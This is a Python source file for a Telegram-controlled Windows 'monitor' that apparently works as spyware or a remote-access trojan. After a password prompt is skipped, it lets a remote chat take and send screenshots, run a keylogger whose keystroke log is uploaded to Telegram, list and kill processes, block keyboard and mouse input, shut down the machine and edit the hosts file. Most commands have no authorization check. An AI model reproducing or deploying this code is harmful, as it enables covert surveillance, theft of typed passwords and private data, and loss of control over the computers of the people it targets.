from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import json
import os
import pyautogui
from telegram import Update, InputFile
import psutil
from telegram.ext import ContextTypes
import win32gui
import win32process
import subprocess
from pynput import keyboard
from telegram import InputFile
import asyncio
import socket
import requests
import ctypes
from telegram.error import TimedOut, NetworkError
import sys
import time
import tkinter as tk
import threading

async def safe_send_message(bot, chat_id, text):
    try:
        await bot.send_message(chat_id=chat_id, text=text)
    except asyncio.TimeoutError:
        print("Telegram request timed out (asyncio)")
    except TimedOut:
        print("Telegram TimedOut error caught")
    except NetworkError as e:
        print(f"Telegram NetworkError: {e}")
    except Exception as e:
        print(f"Unexpected Telegram error: {e}")

monitoring = True

# === Load config ===
if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(__file__)

config_path = os.path.join(base_path, "config.json")
with open(config_path, "r") as f:
    config = json.load(f)

correct_password = config["pass"]
chat_id = config["chat_id"]
bot_token = config["tele_token"]

# === Password Prompt Class ===
class PasswordPrompt:
    def __init__(self, timeout=30):
        self.timeout = timeout
        self.correct = False

        self.root = tk.Tk()
        self.root.title("🔐 Authentication Required")
        self.root.geometry("300x150")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.label = tk.Label(self.root, text="Enter password to stop monitoring:")
        self.label.pack(pady=(10, 0))

        self.entry = tk.Entry(self.root, show="*")
        self.entry.pack(pady=5)
        self.entry.focus()

        self.submit_btn = tk.Button(self.root, text="Submit", command=self.check_password)
        self.submit_btn.pack(pady=(5, 10))

        self.timer_label = tk.Label(self.root, text=f"⏳ Time remaining: {self.timeout}s")
        self.timer_label.pack()

        self.remaining = self.timeout
        self.update_timer()

    def check_password(self):
        if self.entry.get() == correct_password:
            self.correct = True
        self.root.destroy()

    def update_timer(self):
        if self.remaining > 0:
            if self.is_minimized():
                print("❌ Prompt minimized.")
                self.root.destroy()
                return
            self.timer_label.config(text=f"⏳ Time remaining: {self.remaining}s")
            self.remaining -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.root.destroy()

    def is_minimized(self):
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.IsIconic(hwnd)

    def on_close(self):
        self.root.destroy()

    def run(self):
        self.root.mainloop()
        return self.correct
    
# === Run Prompt ===
if PasswordPrompt(timeout=30).run():
    print("✅ Password correct. Exiting monitor.")
    sys.exit(0)

# === Password wrong or skipped ===
print("❌ Access denied or skipped. Starting monitoring...")

# Simulate monitoring activity
for i in range(5):
    print(f"Monitoring... ({i+1})")
    time.sleep(1)

print("✅ Monitor is running.")

# === Globals ===
klstopev = None
kllist = None
kl_task = None
log_f = "keylog.txt"
pressed_keys = set()

print("🟢 monitor.py has started")

# Load config
try:
    with open(config_path, "r") as f:
        config = json.load(f)
except Exception as e:
    print(f"Config load failed: {e}")
    sys.exit(1)

BOT_TOKEN = config["tele_token"]

system_processes = [
        "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", "wininit.exe",
        "services.exe", "winlogon.exe", "fontdrvhost.exe", "svchost.exe", "lsass.exe", "LsaIso.exe",
        "dwm.exe", "WUDFHost.exe", "RuntimeBroker.exe", "conhost.exe", "fontdrvhost.exe"
    ]



# Correctly named command handler
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📌 Here are the commands I support:\n"
        "/help\n"
        "/screenshot\n"
        "/task\n"
        "/kill\n"
        "/l -lock the pc\n"
        "/s -sleepy time\n"
        "/sr -(ONLY IF NECESSARY)\n"
        "/kl - key logger\n"
        "/battery\n"
        "/net\n"
        "/ip\n"
        "/linp\n"
        "/bsite\n"
        "/stop"
    )
#takes a screenshot
async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    image_path = "screen.png"
    try:
        image = pyautogui.screenshot()
        image.save(image_path)
        with open(image_path, "rb") as img:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(img))

        await asyncio.sleep(1)

        os.remove(image_path)
    except Exception as e:
        await update.message.reply_text(f"failed{e}")
        os.remove(image_path)

# === task manager comands ===
async def tm_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🧠 Task Manager Options:\n\n"
        "/shwin -apps with visible windows\n"
        "/shbg -background processes\n"
        "/shall -all running apps (filtered)\n"
    )
    
async def shwin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    titles = []
    def callback(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd).strip()
            if title:
                try:
                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
                    proname = psutil.Process(pid).name()
                    titles.append((pid, proname, title))  # ✅ only this
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    win32gui.EnumWindows(callback, None)

    if not titles:
        await update.message.reply_text("❌ No windowed apps detected.")
    else:
        reply_lines = [f"{pid:<6} {name:<25} {title}" for pid, name, title in titles[:30]]
        reply = "🪟 Windowed Apps (with PID):\n\n" + " \n\n".join(reply_lines)
        await update.message.reply_text(reply)

async def shbg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = []
    # Also show basic filtered running apps
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name'][:25]
            pid = proc.info['pid']
            if name and name not in system_processes:
                lines.append(f"{pid:>6} {name:<25}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if lines:
        procs = "🧠 Running Apps (filtered):\n\n" + "\n".join(lines[:30])
        await update.message.reply_text(procs)
           
async def shall(update: Update, context: ContextTypes.DEFAULT_TYPE):
        titles = []
        lines = []
        def callback(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd).strip()
                if title:
                    try:
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        proname = psutil.Process(pid).name()
                        titles.append((pid, proname, title))  # ✅ only this
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        pass

        win32gui.EnumWindows(callback, None)

        if not titles:
            await update.message.reply_text("❌ No windowed apps detected.")
        else:
            reply_lines = [f"{pid:<6} {name:<25} {title}" for pid, name, title in titles[:30]]
            reply = "🪟 Windowed Apps (with PID):\n\n" + " \n\n".join(reply_lines)
            await update.message.reply_text(reply)
        # Also show basic filtered running apps
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                name = proc.info['name'][:25]
                pid = proc.info['pid']
                if name and name not in system_processes:
                    lines.append(f"{pid:>6} {name:<25}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if lines:
            procs = "🧠 Running Apps (filtered):\n\n" + "\n".join(lines[:30])
            await update.message.reply_text(procs)

# === kill apps ===
async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("🛑 Please enter the PID you want to kill.\n\nExample:\n/kill 1234")
            return
        
        pid = int(context.args[0])
        proc = psutil.Process(pid)
        name = proc.name()
        proc.terminate()
        proc.wait(timeout=5)

        await update.message.reply_text(f"✅ Killed process: {name} (PID: {pid})")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid PID number.")
    except psutil.NoSuchProcess:
        await update.message.reply_text(f"❌ No process found with PID {pid}.")
    except psutil.AccessDenied:
        await update.message.reply_text(f"❌ Access denied. Try running this script as Administrator.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")    

# === lock and sleep ===
async def lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
        await update.message.reply_text("PC locked")
    except Exception as e:
        await update.message.reply_text(f" Failed : {e}")

async def sleep(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
        await update.message.reply_text("💤 PC is going to sleep.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to sleep: {e}")

# === shutdown restart ===
async def sr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🧠 Task Manager Options:\n\n"
        "/sd -shut down\n"
        "/rt -restart\n"
    )

async def sd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("shutdown /s /t 1", shell=True)
        await update.message.reply_text("💤 PC is going to shut down.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to shut down: {e}")

async def rt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("shutdown /r /t 1", shell=True)
        await update.message.reply_text("💤 PC is going to restart.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to restart: {e}")

# === Keylogger ===
#pressing skl together stops the key logger
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            pressed_keys.add(key.char.lower())
        with open(log_f, "a") as f:
            f.write(key.char)
    except AttributeError:
        pressed_keys.add(str(key))
        with open(log_f, "a") as f:
            f.write(f"[{key.name}]")
    if {'s', 'k', 'l'}.issubset(pressed_keys):
        if klstopev:
            klstopev.set()
        if kllist:
            kllist.stop()
        return False  # stop the listener

def on_release(key):
    try:
        if hasattr(key, 'char') and key.char:
            pressed_keys.discard(key.char.lower())
        else:
            pressed_keys.discard(str(key))
    except:
        pass
    
async def keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global klstopev, kllist, kl_task
    if kl_task and not kl_task.done():
        await update.message.reply_text("⚠️ Keylogger already running.")
        return

    klstopev = asyncio.Event()
    open(log_f, "w").close()

    kllist = keyboard.Listener(on_press=on_press, on_release=on_release)
    kllist.start()

    kl_task = asyncio.create_task(run_keylogger(update, context))
    await update.message.reply_text("🎹 Keylogger started. Press ESC or use /stopkl to stop.")

async def run_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global kllist, klstopev
    await klstopev.wait()

    if kllist and kllist.running:
        await asyncio.get_running_loop().run_in_executor(None, kllist.join)

    try:
        with open(log_f, "rb") as f:
            await update.message.reply_document(InputFile(f, filename="keylog.txt"))
        os.remove(log_f)
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending log: {e}")

async def stopkeylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global klstopev, kllist, kl_task
    if not klstopev or klstopev.is_set():
        await update.message.reply_text("ℹ️ Keylogger not running.")
        return

    klstopev.set()  # signal keylogger task
    if kllist:
        kllist.stop()
        await asyncio.get_running_loop().run_in_executor(None, kllist.join)

    await update.message.reply_text("🛑 Keylogger stopped. Sending log...")
    if kl_task:
        await kl_task

#shows battery life, charging, etc
async def battery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    battery = psutil.sensors_battery()
    if battery:
        percent = battery.percent
        plugged = "⚡ Charging" if battery.power_plugged else "🔋 On battery"
        await update.message.reply_text(f"{plugged}\nBattery: {percent}%")
    else:
        await update.message.reply_text("⚠️ Battery info not available.")

#shows the ip address
async def network(update: Update, context: ContextTypes.DEFAULT_TYPE):
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    await update.message.reply_text(f"📶 Hostname: {hostname}\n🌐 Local IP: {local_ip}")

#public id
async def ipadd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ip = requests.get('https://api.ipify.org').text
        await update.message.reply_text(f"🌍 Public IP: {ip}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to get public IP: {e}")

#block input
async def lockinput(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ctypes.windll.user32.BlockInput(True)
        await update.message.reply_text("🛑 Input locked for 10 seconds...")

        await asyncio.sleep(10)

        ctypes.windll.user32.BlockInput(False)
        await update.message.reply_text("✅ Input unlocked.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to lock input: {e}")

#block site
async def blocksite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /blocksite example.com")
        return

    domain = context.args[0]
    line = f"127.0.0.1 {domain}\n"
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

    try:
        # Check for admin rights
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await update.message.reply_text("❌ Admin rights required to modify hosts file.")
            return

        with open(hosts_path, "a") as f:
            f.write(line)
        await update.message.reply_text(f"🔒 Blocked: {domain}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

async def stop_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global monitoring_active
    user_id = update.effective_chat.id

    # Optional: Restrict command to only the authorized user
    if str(user_id) != str(config["chat_id"]):
        await update.message.reply_text("❌ Unauthorized access.")
        return

    await update.message.reply_text("🛑 Monitoring stopped. Exiting program...")
    monitoring_active = False

    # Delay a moment to allow message delivery
    await asyncio.sleep(1)

    # Exit script after a brief delay
    threading.Thread(target=lambda: (time.sleep(1), os._exit(0))).start()

async def on_startup(app):
    try:
        await app.bot.send_message(chat_id=config["chat_id"], text="🖥️ PC has started and bot is online.")
    except Exception as e:
        print(f"Startup notification failed: {e}")



app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("help", help_command))
app.add_handler(CommandHandler("screenshot", ss_command))
app.add_handler(CommandHandler("task", tm_command))
app.add_handler(CommandHandler("shwin", shwin))
app.add_handler(CommandHandler("shbg", shbg))
app.add_handler(CommandHandler("shall", shall))
app.add_handler(CommandHandler("kill", kill))
app.add_handler(CommandHandler("l", lock))
app.add_handler(CommandHandler("s", sleep))
app.add_handler(CommandHandler("sd", sd))
app.add_handler(CommandHandler("rt", rt))
app.add_handler(CommandHandler("kl", keylogger))
app.add_handler(CommandHandler("stopkl", stopkeylogger))
app.add_handler(CommandHandler("battery", battery))
app.add_handler(CommandHandler("net", network))
app.add_handler(CommandHandler("ip", ipadd))
app.add_handler(CommandHandler("linp", lockinput))
app.add_handler(CommandHandler("bsite", blocksite))
app.add_handler(CommandHandler("stop", stop_monitor))


print("✅ Bot is running and listening...")

app.post_init = on_startup
app.run_polling()



